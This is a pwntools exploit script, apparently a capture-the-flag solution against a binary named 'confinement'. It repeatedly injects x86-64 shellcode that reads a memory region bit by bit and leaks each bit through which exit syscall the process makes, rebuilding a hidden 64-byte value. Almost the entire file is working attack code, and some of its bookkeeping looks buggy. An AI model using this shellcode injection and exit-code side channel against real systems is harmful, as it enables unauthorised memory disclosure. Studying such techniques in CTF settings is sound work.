from pwn import *
from icecream import ic

exe = ELF("./confinement_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'x86-64'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000022250
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

binary_val = ""
temp = ""
byte_val = 0
for i in range(0, 64):
    # shift_val = 0
    for j in range(0, 8):
        io = start()
        shellcode = asm(f'''
                    
                    lea rbx, [r8-0x1290]
                    mov rcx, [rbx + {i}]
                    shr rcx, {j}
                    and rcx, 0x1
                    cmp rcx, 0x0
                    je label
                    mov rax, 0x3c
                    mov rdi, 0
                    syscall

                    label:
                    mov rax, 231
                    mov rdi, 0
                    syscall

                    ''')
        # shift_val += 1
        sl(shellcode)
        val = rl().decode()[:-1]
        print(val)
        if(val == "adios"):
            temp += "0"
        else:
            temp += "1" 
        if(j == 7):           
            binary_val = temp[::-1]
    print(binary_val)     
    io.close()
print(binary_val)   
io.interactive()